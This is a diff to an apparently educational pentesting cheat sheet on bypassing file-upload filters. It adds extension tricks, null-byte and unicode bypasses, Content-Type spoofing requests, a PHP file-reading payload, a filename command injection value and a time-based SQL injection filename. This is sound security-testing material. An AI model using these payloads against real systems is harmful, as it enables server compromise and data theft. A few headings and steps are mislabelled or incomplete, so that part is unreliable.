@@ -6,6 +6,8 @@
 
 ## Cheat Sheet
 
+### Methodology
+
 #### Stored Cross-Site Scripting (Stored XSS) via SVG Upload
 
 {% stepper %}
@@ -44,18 +46,198 @@ Click forward the request and after creating the image, open it and Check if an 
 
 ***
 
-####
+#### File Extension Filter Bypass
 
 {% stepper %}
 {% step %}
-###
+Check what are file extensions allowed in the web app. This depends on the type of backend server
 
-
+`.php` ,`.html`, `.jsp`, `.svg`, `.asp`, `.aspx` ,`pHp`, `pHP5`, `PhAr`, `hTmL`, `etc` ,`.pht` ,`.phps` ,`.phar` ,`.phpt` ,`.pgif` ,`.phtml` ,`.phtm` ,`.inc`
 {% endstep %}
 
 {% step %}
-###
+#### Double-extension upload bypass
+
+Try adding a valid extension before the execution extension `exploit.png.php or exploit.php.png`&#x20;
+{% endstep %}
+
+{% step %}
+#### Trailing-extension upload bypass
+
+Check adding a valid extension at the end `exploit.php/.jpg` ( app may save this as a .php file but recognizes as `.jpg`)
+{% endstep %}
+
+{% step %}
+#### Encoding Bypass
+
+Try encoding `exploit.php%0d%0a.jpg or exploit.jpg%0d%0a.php`
+{% endstep %}
+
+{% step %}
+#### Null Byte Injection Bypass
+
+Upload a file with a null byte injection `exploit.php%00.jpg or exploit.jpg%00.php`
+{% endstep %}
+
+{% step %}
+#### Semicolon extension bypass
+
+Add semicolons before the file extension `exploit.asp;.jpg`
+{% endstep %}
+
+{% step %}
+#### Multibyte Unicode filename normalization bypass
+
+Try using multibyte unicode characters, which may be converted to null bytes and dots after unicode conversion or normalization Sequences like xC0 x2E, xC4 xAE or xC0 xAE may be translated to x2E if the filename parsed as a UTF-8 string, but then converted to ASCII characters before being used in a path
+{% endstep %}
+
+{% step %}
+#### Overlapping-extension bypass
+
+Try positioning the prohibited string in such a way that removing it still leaves behind a valid file extension. For example, consider what happens if you strip .php from the following filename:\
+`exploit.p.phphp`
+{% endstep %}
+
+{% step %}
+#### Filename-based XSS
+
+Try to put the XSS payload in the name of the `filetest.jpg`,`test.jpg`
+{% endstep %}
+
+{% step %}
+#### Filename-based command injection
+
+Command Injection in the `filename e.g. ; sleep 10;`
+{% endstep %}
+
+{% step %}
+#### Content-Type spoofing
+
+Try to use extension as .html and change Content-Type to `html/text`
+
+```http
+------WebKitFormBoundary6IrxqgTfmnW0FkOZ
+Content-Disposition: form-data; name="uploadimage"; 
+filename="exploit.html"
+Content-Type: html/text
+```
+{% endstep %}
+
+{% step %}
+#### Missing Content-Type upload bypass
+
+Try to send the request with no Content-Type
+
+```http
+------WebKitFormBoundary6IrxqgTfmnW0FkOZ
+Content-Disposition: form-data; name="uploadimage"; 
+filename="exploit.html"
 
 
+<code here>
+```
+{% endstep %}
+
+{% step %}
+#### Content-Type spoofing
+
+Try to use extension as `.jpg/png` ( if app expects image only) but change Content-Type to `text/html`
+
+```http
+------WebKitFormBoundary6IrxqgTfmnW0FkOZ
+Content-Disposition: form-data; name="uploadimage"; 
+filename="exploit.jpg"
+Content-Type: text/html
+```
+{% endstep %}
+
+{% step %}
+#### Extensionless upload + Content-Type spoofing
+
+Try leaving extension blank and Content-Type: text/html
+
+```http
+------WebKitFormBoundary6IrxqgTfmnW0FkOZ
+Content-Disposition: form-data; name="uploadimage"; 
+filename="file."
+Content-Type: text/html
+```
+{% endstep %}
+
+{% step %}
+#### Extension-only upload + Content-Type spoofing
+
+Try using the extension only&#x20;
+
+```http
+------WebKitFormBoundary6IrxqgTfmnW0FkOZ
+Content-Disposition: form-data; name="uploadimage"; 
+filename=".html"
+Content-Type: image/png
+```
+{% endstep %}
+
+{% step %}
+#### Filename special-characters bypass
+
+Try to use especial characters in the names
+
+```http
+------WebKitFormBoundary6IrxqgTfmnW0FkOZ
+Content-Disposition: form-data; name="uploadimage";
+filename="exploit.jpg#/?&=+.html"
+Content-Type: image/jpeg
+```
+{% endstep %}
+
+{% step %}
+#### File Upload Manipulation
+
+Try changing Content-Type\
+When uploading, Content Type could be: Content-Type: `application/octet-stream` or Content-Type: `application/x-php` try replacing it with`image/jpeg/`,`image/jpg`, `image.png`, `image/gif`
+
+```http
+------WebKitFormBoundary6IrxqgTfmnW0FkOZ
+Content-Disposition: form-data; name="avatar"; filename="exploit.php"
+Content-Type: application/octet-stream
+
+<?php echo file_get_contents('/home/carlos/secret'); ?>
+```
+{% endstep %}
+
+{% step %}
+### Unicode Bypass
+
+Try to use Unicode
+
+```http
+Content-Disposition: form-data; name="uploadimage"; 
+filename="exploit.jpg%u0025%u0030%u0039.php"
+Content-Type: application/php
+
+<?php echo file_get_contents('/home/carlos/secret'); ?>
+```
+{% endstep %}
+
+{% step %}
+#### Time-Based SQLi Payloads
+
+```
+poc.js'(select*from(select(sleep(20)))a)+'.extension
+```
+{% endstep %}
+
+{% step %}
+#### NTFS Alternate Data Streams (ADS) abuse
+
+Sometimes applications identify file types based on their first signature bytes. Adding/replacing them in a file might trick the application
+
+```
+PNG: \x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03[
+JPG: \xff\xd8\xff
+GIF: GIF87a OR GIF8;
+```
+
+Using NTFS alternate data stream (ADS) in Windows. In this case, a colon character ":" will be inserted after a forbidden extension and before a permitted one. As a result, an empty file with the forbidden extension will be created on the server ("`file.asax:.jpg`") This file might be edited later using other techniques such as using its short filename. The "::$data" pattern can also be used to create non-empty files. Therefore, adding a dot character after this pattern might also be useful to bypass further restrictions ("`file.asp::$data.`")
 {% endstep %}
 {% endstepper %}
